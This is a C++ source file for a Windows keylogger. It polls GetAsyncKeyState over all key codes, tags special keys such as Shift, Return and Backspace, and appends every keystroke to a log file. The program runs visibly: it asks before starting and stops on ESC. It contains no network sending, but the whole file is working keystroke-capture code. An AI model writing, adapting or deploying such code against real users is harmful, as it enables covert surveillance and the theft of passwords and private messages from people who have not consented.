#include <iostream>
#include <windows.h>
#include <conio.h>
#include <fstream>
#include "keylogger.h"
using namespace std;

int keys(char key, fstream& file);
fstream afile;

void keylogger() {
    // Enter your path to the log file 
    const char* filePath = "";
    
    char askForStart[2];
    cout << "Start keylogger (y/n): ";
    cin.getline(askForStart, 2);

    if (askForStart[0] == 'y') {
        afile.open(filePath, ios::out | ios::app);  // Open file in append mode 
        if (!afile) {
            cerr << "Error opening file at: " << filePath << endl;
            return;
        }

        cout << "Keylogger started. Press 'ESC' to stop." << endl;

        while (true) {
            //
            for (int i = 8; i <= 255; i++) {
                // Check if key is pressed
                if (GetAsyncKeyState(i) & 0x8000) {  
                    if (i == VK_ESCAPE) {  // Stop the keylogger if ESC is pressed
                        cout << "Keylogger stopped." << endl;
                        afile.close();
                        return;
                    }
                    keys(i, afile);  // Log the key

                 
                    while (GetAsyncKeyState(i) & 0x8000) {
                        Sleep(10);  
                    }
                }
            }
            Sleep(1);  
        }
    } else if (askForStart[0] == 'n') {
        cout << "Keylogger not started." << endl;
        return;
    } else {
        cout << "Invalid input." << endl;
        return;
    }
}

int keys(char key, fstream& file) {
    if (file) {  
        if (GetAsyncKeyState(VK_SHIFT)) {
            file << "[SHIFT]";
        } else if (GetAsyncKeyState(VK_ESCAPE)) {
            file << "[ESCAPE]";
        } else if (GetAsyncKeyState(VK_RETURN)) {
            file << "[RETURN]";
        } else if (GetAsyncKeyState(VK_CONTROL)) {
            file << "[CONTROL]";
        } else if (GetAsyncKeyState(VK_MENU)) {  
            file << "[ALT]";
        } else if (GetAsyncKeyState(VK_DELETE)) {
            file << "[DELETE]";
        } else if (GetAsyncKeyState(VK_TAB)) {
            file << "[TAB]";
        } else if (GetAsyncKeyState(VK_BACK)) {
            file << "[BACKSPACE]";
        } else {
            // Storing the keystrokes (other than special keys) in the file
            file << char(key);
        }
    }
    return 0;
}
